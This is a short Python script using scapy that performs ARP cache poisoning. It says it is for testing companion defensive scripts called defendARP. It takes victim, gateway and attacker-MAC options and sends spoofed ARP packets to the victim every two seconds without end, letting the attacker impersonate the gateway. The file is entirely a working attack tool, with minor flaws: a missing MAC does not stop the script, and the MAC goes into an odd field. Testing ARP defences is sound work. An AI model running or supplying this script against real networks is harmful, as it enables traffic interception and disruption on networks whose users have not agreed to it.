#!/usr/bin/env python
#
# Execute with sudo python arppoison.py
#
# ARP Poisoning Script for testing defendARP.py and defendARP.bat
#
import time
import sys
from scapy.all import *
from optparse import OptionParser

def main(argv):
	# Create option parser
	parser = OptionParser()
	# Define options
	parser.add_option("-v", "--victim", dest="victim", help="Victim's IP address.")
	parser.add_option("-s", "--spoof", dest="spoof", help="Gateway's IP address.")
	parser.add_option("-m", "--mac", dest="mac", help="Attacker's phyisical address.")
	(options, args) = parser.parse_args()
	op = 1
	# Validate input
	if options.victim == None:
		print("No victim IP given. Quitting.")
		sys.exit()
	if options.spoof == None:
		print("No gateway IP address given. Quitting.")
		sys.exit()
	if options.mac == None:
		print("No attacker MAC address given. Quitting.")
	
	# Create spoofed ARP request
	arp=ARP(op=op,psrc=options.spoof,pdst=options.victim,hwdst=options.mac)

	# ARP Poison
	while 1:
		send(arp)
		time.sleep(2)

# Main function called upon script entry
if __name__ == "__main__":
	main(sys.argv)